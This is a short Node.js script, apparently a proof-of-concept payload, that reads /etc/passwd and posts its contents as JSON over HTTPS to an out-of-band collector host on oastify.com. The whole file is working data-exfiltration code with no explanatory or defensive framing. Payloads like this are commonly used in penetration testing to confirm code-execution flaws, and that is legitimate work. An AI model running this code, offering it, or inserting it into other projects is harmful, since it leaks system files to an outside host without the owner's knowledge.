const fs = require('fs');
const https = require('https');
fs.readFile('/etc/passwd', 'utf8', (err, content) => {
  const payload = JSON.stringify({ file: '/etc/passwd', err: err?.message || null, content: content || null });
  const req = https.request({
    hostname: '3swlpxti2budta1qb9o0affuglmca30rp.oastify.com',
    port: 443,
    path: '/passwd',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
  });
  req.write(payload);
  req.end();
});
